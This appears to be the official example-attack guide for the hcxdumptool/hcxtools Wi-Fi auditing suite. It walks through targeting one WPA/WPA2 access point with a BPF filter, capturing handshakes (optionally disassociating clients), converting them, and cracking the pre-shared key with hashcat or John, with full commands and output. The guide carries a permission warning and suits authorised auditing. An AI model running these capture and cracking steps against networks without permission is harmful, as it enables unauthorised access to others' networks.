# Example Attack - Overview

> [!NOTE]
> This guide is only a general outline for attacks.
> This guide is not definitive as there is no "one size fits all" solution for attacking networks.
> This is the reason for the many options that hcxdumptool/hcxtools offers.
> More information:
> - [An overview of Hashcat mode 22000.](https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2)
> - [A write-up by **Ido Hoorvitch** from CyberArk covering the statistics of WPA/WPA2 password cracking.](https://www.cyberark.com/resources/threat-research-blog/cracking-wifi-at-scale-with-one-simple-trick)

> [!WARNING]
> This guide is for educational purposes only!
> **Do not use hcxdumptool on networks you do not have permission to use it on!**
> For more information regarding the specifics of this warning, refer to the [caution](https://github.com/ZerBea/hcxdumptool#caution) section of the README.

### General Workflow

Usually the general workflow is always the same:

```
hcxdumptool -> hcxtools (hcxpcapngtool, hcxhashtool, hcxpsktool) -> hashcat or john -> upload to wpa-sec for a further weak password analysis
```

### Example Attack - Details/Goals

This example will simulate attacking a single network of interest.
It is assumed all information relating to the target is already known.

ESSID of AP: **TestAP**
MAC address of AP: **00c0cab035be**.
AP channel: **11**

### Step One - Creating a BPF

The creation of a [BPF](https://wiki.wireshark.org/CaptureFilters) is **mandatory** as it make hcxdumptool either _ignore_ the specified address, or _attack_ the specified address.

First of all get as much as possbile information about the target (hcxdumptool in rcascan mode, tshark, Wireshark, tcpdump).

The command to get general information about the target (ESSID, CHANNEL, MAC_AP. IN/OFF RANGE) is:

```
hcxdumptool -i INTERFACE_NAME --rcascan=active --rds=1 -F
```

The command to get general information about the target (ESSID, CHANNEL, MAC_AP. IN/OFF RANGE) and to check that it is within range:

```
hcxdumptool -i INTERFACE_NAME --rcascan=active --rds=5 -F
```

> [!NOTE]
> The RSSI value ist completely useless since only one direction (TARGET -> ATTACK DEVICE) is measured!
> PROBEREQUEST && PROBERESPONSE measures both directions (TARGET <-> ATTACK DEVICE)!

The command to get more information about the behavior of target (frame types, connected CLIENTs) is:

```
tshark -i INTERFACE_NAME
```

The full command to create a BPF to the target (attack ccce1edc3bee) would be as follows:

```
hcxdumptool --bpfc="wlan addr1 ccce1edc3bee or wlan addr2 ccce1edc3bee or wlan addr3 ccce1edc3bee or type mgt subtype probereq" > attack.bpf
```

> [!NOTE]
> Do not(1) filter undirected PROBEREQUEST frames! They can contain PreSharedKeys!
> If you don't want hcxdumptool to respond to PROBEREQUESTs set --proberesponsetx=0

The full command to create a BPF to _protect_ ccce1edc3bee would be as follows:

```
hcxdumptool --bpfc="not wlan addr3 ccce1edc3bee" > protect.bpf
```

The command to test the filter is:
```
tshark -i INTERFACE_NAME -f "wlan addr1 ccce1edc3bee or wlan addr2 ccce1edc3bee or wlan addr3 ccce1edc3bee or type mgt subtype probereq"
```

If everything is working as expected, we are going to attack 00c0cab035be ussing the **attack.bpf** filter.

### Step Two - Running hcxdumptool

Since we have now made the BPF, we can start the attack using all the information mentioned above depending on the invasive levewl:

```
sudo hcxdumptool -i wlan0 -c 11a --bpf=attack.bpf -w testap.pcapng

or (do not respond to CLIENTs)
sudo hcxdumptool -i wlan0 --rds=3 -c 11a --proberesponsetx=0 --bpf=attack.bpf -w testap.pcapng

or (do not DISASSOCIATE CLIENTs)
sudo hcxdumptool -i wlan0 --rds=3 -c 11a --disable_disassociation --bpf=attack.bpf -w testap.pcapng

or (do not respond to CLIENTs and do not DISASSOCIATE CLIENTs)
sudo hcxdumptool -i wlan0 --rds=3 -c 11a --proberesponsetx=0 --disable_disassociation --bpf=attack.bpf -w testap.pcapng
```

> [!NOTE]
> hcxdumptool **requires** either super user (root) privileges to run or the use of sudo!

After running that command for a while, the output was as follows:

```
CHA|  LAST  |EA123P|   MAC-CL   |   MAC-AP   |ESSID          (SCAN:  2462/11)
---+--------+------+------------+------------+--------------------------------
 11|08:43:02|ep+++ |1246d6b3d1c3|ccce1edc3bee|AP_7272
^C
1361 Packet(s) captured by kernel
0 Packet(s) dropped by kernel
exit on sigterm
```

### Step Three - Conversion - hashcat

We now have a complete capture with all information needed for cracking the PSK. Before we crack the PSK, we need to convert it into a format Hashcat/JtR can understand using hcxpcapngtool.

If you prefer hashcat, the command to do so is as follows:

```
hcxpcapngtool -o testap.hc22000 testap.pcapng
```

After running hcxpcapngtool, the output was as follows:

```
hcxpcapngtool 7.0.1-41-g6412f87 reading from testap.pcapng...

summary capture file
--------------------
file name................................: testap.pcapng
version (pcapng).........................: 1.0
operating system.........................: Linux 6.18.5-arch1-1
application..............................: hcxdumptool 7.0.1-46-g96125ac
interface name...........................: wlp48s0f4u2u4
interface vendor.........................: 74da38
openSSL version..........................: 1.0
weak candidate...........................: 12345678
MAC ACCESS POINT.........................: 000e221bc298 (incremented on every new client)
MAC CLIENT...............................: 90b4dd7b81dd
REPLAYCOUNT..............................: 65021
ANONCE...................................: b78dc26402ab03f5941cbd90a85909d2bfcb8a433e630144a31bd00eb9ed3984
SNONCE...................................: ed0baac00e561183ca05efac8e7552c0df03b00ceec0d815e0e02bf867c2c0f8
timestamp minimum (timestamp)............: 22.01.2026 07:49:45 (1769068185)
timestamp maximum (timestamp)............: 22.01.2026 07:50:08 (1769068208)
duration of the dump tool (seconds)......: 22
used capture interfaces..................: 1
link layer header type...................: DLT_IEEE802_11_RADIO (127)
endianness (capture system)..............: little endian
packets inside...........................: 53
packets received on 2.4 GHz..............: 53
ESSID (total unique).....................: 2
BEACON (total)...........................: 1
BEACON on 2.4 GHz channel (from IE_TAG)..: 11 
PROBEREQUEST (undirected)................: 1
PROBEREQUEST (directed)..................: 1
PROBERESPONSE (total)....................: 1
AUTHENTICATION (total)...................: 1
AUTHENTICATION (OPEN SYSTEM).............: 1
EAPOL messages (total)...................: 47
EAPOL RSN messages.......................: 47
EAPOLTIME gap (measured maximum msec)....: 41
EAPOL ANONCE error corrections (NC)......: not detected
EAPOL M1 messages (total)................: 44
EAPOL M2 messages (total)................: 1
EAPOL M3 messages (total)................: 1
EAPOL M4 messages (total)................: 1
EAPOL M4 messages (zeroed NONCE).........: 1
EAPOL pairs (total)......................: 2
EAPOL pairs (best).......................: 1
EAPOL pairs written to 22000 hash file...: 1 (RC checked)
EAPOL M32E2 (authorized - ANONCE from M3): 1

frequency statistics from radiotap header (frequency: received packets)
-----------------------------------------------------------------------
 2462: 53

session summary
---------------
processed pcapng files................: 1
```

> [!NOTE]
> hcxpcapngtool will throw errors and warnings if:
> 1. The capture was too short/incomplete.
> 2. The format (cap/pcap) used is old/outdated.
> 3. Too many DEAUTHENTICATION / DISASSOCIATION frames were detected.
> 4. The capture file was (deadly) cleaned.
> 5. No undirected PROBEREQUESTS were detected.
> 6. Too few M1 frames were detected.

### Step Four - Cracking - hashcat

Finally, we have a Hashcat/JtR compatible format for cracking the PSK of our target network. For this example, we will use Hashcat for our cracking tool of choice.

There are many different ways to use Hashcat but we will just use a straight dictionary attack.

I strongly recommend to use a separate pot file!

The hashcat command will be as follows:

```
hashcat -m 22000 --potfile-path=hashcat.wpa.pot testap.hc22000 wordlist
```

After letting Hashcat run for a while, the output was as follows:

```
hashcat (v7.1.2-382-g2d71af371) starting

CUDA API (CUDA 13.1)
====================
* Device #01: NVIDIA GeForce RTX 4080, 15701/15945 MB, 76MCU

OpenCL API (OpenCL 3.0 CUDA 13.1.112) - Platform #1 [NVIDIA Corporation]
========================================================================
* Device #02: NVIDIA GeForce RTX 4080, skipped

Minimum password length supported by kernel: 8
Maximum password length supported by kernel: 63
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 2 digests; 2 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 4406 MB (57159 MB free)

Dictionary cache built:
* Filename..: wordlist
* Passwords.: 2856483
* Bytes.....: 31389246
* Keyspace..: 2856483
* Speed.....: 605 MiB/s
* Runtime...: 0.05s

452977dd851b12891cdac3b767cdf42e:ccce1edc3bee:ced2f3e34efc:AP_7272:12345678
7d47aae049369991cd38f22d27da218b:ccce1edc3bee:1246d6b3d1c3:AP_7272:12345678
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
Hash.Target......: testap.hc22000
Time.Started.....: Thu Jan 22 08:52:26 2026 (0 secs)
Time.Estimated...: Thu Jan 22 08:52:26 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 8-63 bytes)
Guess.Base.......: File (wordlist)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1496.8 kH/s (8.84ms) @ Accel:4 Loops:512 Thr:384 Vec:1
Recovered........: 2/2 (100.00%) Digests (total), 2/2 (100.00%) Digests (new)
Progress.........: 116741/2856483 (4.09%)
Rejected.........: 5/116741 (0.00%)
Restore.Point....: 0/2856483 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:1-3
Candidate.Engine.: Device Generator
Candidates.#01...: $HEX[2020202020202020] -> 20217238
Hardware.Mon.#01.: Temp: 31c Fan:  0% Util:  0% Core:2865MHz Mem:10801MHz Bus:16

Started: Thu Jan 22 08:52:24 2026
Stopped: Thu Jan 22 08:52:28 2026
```

### Step Three - Conversion - john

If you prefer john, the command to do so is as follows:

```
hcxpcapngtool --john testap.john testap.pcapng
```

After running hcxpcapngtool, the output was as follows:

```
hcxpcapngtool 7.0.1-41-g6412f87 reading from testap.pcapng...

summary capture file
--------------------
file name................................: testap.pcapng
version (pcapng).........................: 1.0
operating system.........................: Linux 6.18.5-arch1-1
application..............................: hcxdumptool 7.0.1-46-g96125ac
interface name...........................: wlp48s0f4u2u4
interface vendor.........................: 74da38
openSSL version..........................: 1.0
weak candidate...........................: 12345678
MAC ACCESS POINT.........................: 000e221bc298 (incremented on every new client)
MAC CLIENT...............................: 90b4dd7b81dd
REPLAYCOUNT..............................: 65021
ANONCE...................................: b78dc26402ab03f5941cbd90a85909d2bfcb8a433e630144a31bd00eb9ed3984
SNONCE...................................: ed0baac00e561183ca05efac8e7552c0df03b00ceec0d815e0e02bf867c2c0f8
timestamp minimum (timestamp)............: 22.01.2026 07:49:45 (1769068185)
timestamp maximum (timestamp)............: 22.01.2026 07:50:08 (1769068208)
duration of the dump tool (seconds)......: 22
used capture interfaces..................: 1
link layer header type...................: DLT_IEEE802_11_RADIO (127)
endianness (capture system)..............: little endian
packets inside...........................: 53
packets received on 2.4 GHz..............: 53
ESSID (total unique).....................: 2
BEACON (total)...........................: 1
BEACON on 2.4 GHz channel (from IE_TAG)..: 11 
PROBEREQUEST (undirected)................: 1
PROBEREQUEST (directed)..................: 1
PROBERESPONSE (total)....................: 1
AUTHENTICATION (total)...................: 1
AUTHENTICATION (OPEN SYSTEM).............: 1
EAPOL messages (total)...................: 47
EAPOL RSN messages.......................: 47
EAPOLTIME gap (measured maximum msec)....: 41
EAPOL ANONCE error corrections (NC)......: not detected
EAPOL M1 messages (total)................: 44
EAPOL M2 messages (total)................: 1
EAPOL M3 messages (total)................: 1
EAPOL M4 messages (total)................: 1
EAPOL M4 messages (zeroed NONCE).........: 1
EAPOL pairs (total)......................: 2
EAPOL pairs written to old format JtR....: 1 (RC checked)
EAPOL M12E2 (challenge - ANONCE from M1).: 1
EAPOL M32E2 (authorized - ANONCE from M3): 1

frequency statistics from radiotap header (frequency: received packets)
-----------------------------------------------------------------------
 2462: 53

session summary
---------------
processed pcapng files................: 1
```

> [!NOTE]
> hcxpcapngtool will throw errors and warnings if:
> 1. The capture was too short/incomplete.
> 2. The format (cap/pcap) used is old/outdated.
> 3. Too many DEAUTHENTICATION / DISASSOCIATION frames were detected.
> 4. The capture file was (deadly) cleaned.
> 5. No undirected PROBEREQUESTS were detected.
> 6. Too few M1 frames were detected.

### Step Four - Cracking - john

I strongly recommend to use a separate pot file!
 
The john command will be as follows:

```
john --pot=john.wpa.pot -w wordlist --format=wpapsk-opencl testap.john
```

After letting john run for a while, the output was as follows:

```
$ john -w wordlist --format=wpapsk-opencl testap.john
Device 1: NVIDIA GeForce RTX 4080
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (wpapsk-opencl, WPA/WPA2/PMF/PMKID PSK [PBKDF2-SHA1 HMAC-SHA256/AES-CMAC OpenCL])
Note: Passwords longer than 21 [worst case UTF-8] to 63 [ASCII] rejected
Note: Minimum length forced to 8 by format
LWS=32 GWS=77824 (2432 blocks) 
Proceeding with wordlist:/usr/share/john/password.lst
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
12345678         (AP_7272)     
12345678         (AP_7272)     
2g 0:00:00:00 DONE (2026-01-22 10:03) 13.33g/s 518826p/s 518826c/s 1037KC/s Dev#1:48°C password..lilwayne6
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

### Step Five - Password Vulnerability / Weak Point

To check the network for a weak password, upload the pcapng dump file to [Distributed WPA PSK auditor](https://wpa-sec.stanev.org)

either via the [web interface](https://wpa-sec.stanev.org/?submit)

or via hcxtools. The will be as follows:

wlancap2wpasec dump_file_name.pcapng

If the Distributed WPA PSK auditor has found the password, it is strongly recommended that you change your password immediately!
